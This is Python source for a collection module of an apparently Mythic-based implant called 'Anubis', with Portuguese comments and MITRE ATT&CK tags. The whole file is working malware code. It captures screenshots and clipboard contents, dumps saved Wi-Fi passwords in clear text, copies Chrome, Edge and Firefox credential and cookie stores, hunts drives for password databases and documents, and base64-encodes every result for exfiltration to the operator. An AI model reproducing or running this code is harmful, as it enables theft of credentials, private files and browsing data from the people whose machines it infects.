    # collection_ext — Anubis agent code (splice como MÉTODO da classe anubis)
    # MITRE TA0009 Collection — retorna JSON string: {"output","files","err"}
    # Assinatura compatível com processTask: self, task_id, **params

    def collection_ext(self, task_id, action="screenshot", path="",
                       exts=".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt",
                       keywords="", browser="chrome", all_drives=False,
                       max_files=200, max_mb=50):
        import os, sys, json, time, base64, subprocess, tempfile

        def resp(out="", files=None, err=""):
            return json.dumps({"output": out, "files": files or [], "err": err})

        def run(cmd, timeout=120):
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
                return r.returncode, ((r.stdout or "") + (r.stderr or "")).strip()
            except Exception as e:
                return -1, str(e)

        def b64file(fp):
            try:
                with open(fp, "rb") as fh:
                    return base64.b64encode(fh.read()).decode()
            except OSError:
                return ""

        # normaliza tipos vindos do Mythic (bool/str/number)
        action = str(action or "screenshot").lower().strip()
        path = str(path or "")
        exts = str(exts or ".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt")
        keywords = str(keywords or "")
        browser = str(browser or "chrome").lower().strip()
        if isinstance(all_drives, str):
            all_drives = all_drives.strip().lower() in ("1", "true", "yes", "sim")
        all_drives = bool(all_drives)
        try:
            max_files = int(max_files)
        except (TypeError, ValueError):
            max_files = 200
        try:
            max_mb = int(max_mb)
        except (TypeError, ValueError):
            max_mb = 50

        if sys.platform != "win32":
            return resp(err="collection_ext: implementado para Windows")

        tmp = tempfile.gettempdir()
        ts = time.strftime("%Y%m%d_%H%M%S")

        # ── SCREENSHOT (T1113) ────────────────────────────────────────────────
        if action == "screenshot":
            shot = os.path.join(tmp, "an_%s.png" % ts)
            # PowerShell limpo (sem caracteres unicode corrompidos)
            ps = (
                "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; "
                "$b = [System.Windows.Forms.SystemInformation]::VirtualScreen; "
                "$bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height; "
                "$g = [System.Drawing.Graphics]::FromImage($bmp); "
                "$g.CopyFromScreen($b.Left, $b.Top, 0, 0, $bmp.Size); "
                "$bmp.Save('%s'); "
                "$g.Dispose(); $bmp.Dispose(); "
                "Write-Output OK"
            ) % shot.replace("'", "''")
            rc, res = run(
                ["powershell.exe", "-NoProfile", "-NonInteractive",
                 "-ExecutionPolicy", "Bypass", "-Command", ps],
                timeout=90,
            )
            data = b64file(shot)
            try:
                os.remove(shot)
            except OSError:
                pass
            if rc == 0 and data:
                return resp(
                    out="[+] Screenshot capturado e exfiltrado",
                    files=[{"name": "screenshot_%s.png" % ts, "b64": data}],
                )
            return resp(err="screenshot falhou: %s" % (res[:300] if res else "sem output"))

        # ── CLIPBOARD (T1115) ─────────────────────────────────────────────────
        if action == "clipboard":
            clip_img = os.path.join(tmp, "an_clip_%s.png" % ts)
            ps = (
                "Add-Type -AssemblyName System.Windows.Forms; "
                "$t = [System.Windows.Forms.Clipboard]::GetText(); "
                "$i = [System.Windows.Forms.Clipboard]::GetImage(); "
                "if ((-not $t) -and $i) { $i.Save('%s'); Write-Output CLIP_IMAGE } "
                "elseif ($t) { Write-Output ('CLIP_TEXT|' + $t) } "
                "else { Write-Output CLIP_EMPTY }"
            ) % clip_img.replace("'", "''")
            rc, res = run(
                ["powershell.exe", "-NoProfile", "-STA", "-NonInteractive",
                 "-ExecutionPolicy", "Bypass", "-Command", ps],
                timeout=60,
            )
            if "CLIP_TEXT|" in res:
                return resp(
                    out="[+] Clipboard (texto):\n" + res.split("CLIP_TEXT|", 1)[1][:8000]
                )
            if "CLIP_IMAGE" in res:
                data = b64file(clip_img)
                try:
                    os.remove(clip_img)
                except OSError:
                    pass
                if data:
                    return resp(
                        out="[+] Clipboard continha imagem (exfiltrado)",
                        files=[{"name": "clipboard_%s.png" % ts, "b64": data}],
                    )
            if "CLIP_EMPTY" in res:
                return resp(out="[*] Clipboard vazio")
            return resp(err="clipboard falhou: %s" % (res[:300] if res else "sem output"))

        # ── WIFI (T1005) ──────────────────────────────────────────────────────
        if action == "wifi":
            rc, profiles = run(["netsh", "wlan", "show", "profiles"])
            if rc != 0:
                return resp(err="netsh wlan falhou: %s" % profiles[:200])
            out_lines = []
            for line in profiles.splitlines():
                line = line.strip()
                if ":" in line and ("Perfil" in line or "Profile" in line):
                    name = line.split(":", 1)[1].strip()
                    if not name:
                        continue
                    _, det = run(
                        ["netsh", "wlan", "show", "profile", "name=%s" % name, "key=clear"]
                    )
                    pwd = ""
                    for l in det.splitlines():
                        if (
                            "Conteudo da Chave" in l
                            or "Key Content" in l
                            or "Conteúdo da Chave" in l
                        ):
                            pwd = l.split(":", 1)[1].strip()
                    out_lines.append("SSID: %-30s Senha: %s" % (name, pwd or "<aberta>"))
            if not out_lines:
                return resp(out="[*] Nenhum perfil Wi-Fi encontrado")
            return resp(
                out="[+] %d perfil(es) Wi-Fi:\n%s" % (len(out_lines), "\n".join(out_lines))
            )

        # ── BROWSER (T1005 / T1555.003) ────────────────────────────────────────
        if action == "browser":
            local = os.environ.get("LOCALAPPDATA", "")
            roaming = os.environ.get("APPDATA", "")
            files = []
            if browser == "firefox":
                prof_root = os.path.join(roaming, "Mozilla", "Firefox", "Profiles")
                if os.path.isdir(prof_root):
                    for prof in os.listdir(prof_root):
                        for fn in (
                            "places.sqlite",
                            "cookies.sqlite",
                            "logins.json",
                            "key4.db",
                            "formhistory.sqlite",
                        ):
                            fp = os.path.join(prof_root, prof, fn)
                            if os.path.isfile(fp):
                                data = b64file(fp)
                                if data:
                                    files.append(
                                        {
                                            "name": "firefox_%s_%s" % (prof[:8], fn),
                                            "b64": data,
                                        }
                                    )
            elif browser in ("chrome", "edge"):
                if browser == "chrome":
                    base = os.path.join(
                        local, "Google", "Chrome", "User Data", "Default"
                    )
                else:
                    base = os.path.join(
                        local, "Microsoft", "Edge", "User Data", "Default"
                    )
                for fn in ("History", "Bookmarks", "Cookies", "Login Data", "Web Data"):
                    fp = os.path.join(base, fn)
                    if os.path.isfile(fp):
                        data = b64file(fp)
                        if data:
                            files.append(
                                {
                                    "name": "%s_%s" % (browser, fn.replace(" ", "_")),
                                    "b64": data,
                                }
                            )
            else:
                return resp(err="browser invalido (chrome/edge/firefox)")
            if not files:
                return resp(out="[*] Nenhum artefato de %s coletado" % browser)
            return resp(
                out=(
                    "[+] %d arquivo(s) de %s exfiltrado(s) "
                    "(Cookies/Login Data cifrados DPAPI — decriptar no operador)"
                    % (len(files), browser)
                ),
                files=files,
            )

        # ── SEARCH (T1005) ────────────────────────────────────────────────────
        if action == "search":
            roots = [path] if path else [os.path.expanduser("~")]
            if all_drives and not path:
                roots = ["C:\\"] + [
                    c + ":\\"
                    for c in "DEFGHIJKLMNOPQRSTUVWXYZ"
                    if os.path.exists(c + ":\\")
                ]
            ext_list = [e.strip().lower() for e in exts.split(",") if e.strip()]
            kw = [k.lower() for k in keywords.split(",") if k.strip()]
            hits = []
            for root in roots:
                if not os.path.isdir(root):
                    continue
                for dirpath, dirnames, filenames in os.walk(root, topdown=True):
                    if root.endswith(":\\"):
                        dirnames[:] = [
                            d
                            for d in dirnames
                            if d
                            not in (
                                "Windows",
                                "Program Files",
                                "Program Files (x86)",
                                "$Recycle.Bin",
                            )
                        ]
                    for fn in filenames:
                        low = fn.lower()
                        if any(low.endswith(e) for e in ext_list) or (
                            kw and any(k in low for k in kw)
                        ):
                            fp = os.path.join(dirpath, fn)
                            try:
                                hits.append("%10d  %s" % (os.path.getsize(fp), fp))
                            except OSError:
                                pass
                            if len(hits) >= max_files:
                                break
                    if len(hits) >= max_files:
                        break
                if len(hits) >= max_files:
                    break
            if not hits:
                return resp(out="[*] Nenhum arquivo bateu com os criterios")
            return resp(out="[+] %d hit(s):\n%s" % (len(hits), "\n".join(hits)))

        # ── GET (T1005) ───────────────────────────────────────────────────────
        if action == "get":
            if not path or not os.path.isfile(path):
                return resp(err="arquivo invalido: %s" % path)
            data = b64file(path)
            if not data:
                return resp(err="nao foi possivel ler: %s" % path)
            return resp(
                out="[+] %s exfiltrado (%d bytes)" % (path, (len(data) * 3) // 4),
                files=[{"name": os.path.basename(path), "b64": data}],
            )

        # ── MULTIGET (T1005) ──────────────────────────────────────────────────
        if action == "multiget":
            roots = [path] if path else [os.path.expanduser("~")]
            ext_list = []
            for e in exts.split(","):
                e = e.strip().lower()
                if not e:
                    continue
                if not e.startswith("."):
                    e = "." + e
                ext_list.append(e)
            kw = [k.lower() for k in keywords.split(",") if k.strip()]
            limit = max_mb * 1024 * 1024
            files, total = [], 0
            for root in roots:
                if not os.path.isdir(root):
                    continue
                for dirpath, dirnames, filenames in os.walk(root, topdown=True):
                    if root.endswith(":\\"):
                        dirnames[:] = [
                            d
                            for d in dirnames
                            if d
                            not in (
                                "Windows",
                                "Program Files",
                                "Program Files (x86)",
                                "$Recycle.Bin",
                            )
                        ]
                    for fn in filenames:
                        low = fn.lower()
                        if not (
                            any(low.endswith(e) for e in ext_list)
                            or (kw and any(k in low for k in kw))
                        ):
                            continue
                        fp = os.path.join(dirpath, fn)
                        try:
                            sz = os.path.getsize(fp)
                        except OSError:
                            continue
                        if total + sz > limit or len(files) >= max_files:
                            continue
                        data = b64file(fp)
                        if data:
                            total += sz
                            files.append({"name": os.path.basename(fp), "b64": data})
            if not files:
                return resp(out="[*] Nada coletado (criterios/limite)")
            return resp(
                out="[+] %d arquivo(s) exfiltrado(s) (%d bytes)" % (len(files), total),
                files=files,
            )

        return resp(
            err="action invalida: screenshot | clipboard | browser | wifi | search | get | multiget"
        )
